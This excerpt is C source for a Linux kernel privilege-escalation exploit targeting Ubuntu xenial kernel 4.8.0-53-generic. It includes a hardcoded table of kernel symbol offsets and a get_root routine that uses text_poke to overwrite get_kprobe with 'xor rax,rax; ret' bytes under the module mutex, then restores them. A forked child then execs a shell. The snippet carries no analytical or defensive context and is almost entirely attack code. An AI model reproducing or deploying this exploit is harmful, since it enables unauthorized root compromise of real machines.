...
struct kernel_info kernels[] = {
	...
	{ "xenial", "4.8.0-53-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x63e843, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
...
void (*mutex_lock)(void *) = (void *)X_mutex_lock;
void (*mutex_unlock)(void *) = (void *)X_mutex_unlock;
void *(*text_poke)(void *, const void *, long) = (void *)X_text_poke;

void get_root() {
	char data[4];
	__builtin_memcpy(data, (void *)X_get_kprobe, sizeof(data));
	mutex_lock((void *)X_module_mutex);
	text_poke((void *)X_get_kprobe, (char []){ "\x48\x31\xc0\xc3" }, 4);
	get_root_real();
	text_poke((void *)X_get_kprobe, data, sizeof(data));
	mutex_unlock((void *)X_module_mutex);
}
...
int main(int argc, char** argv) {
	...
	if (!fork()) {
		sleep(2), execl(SHELL, "shell", NULL);
	}
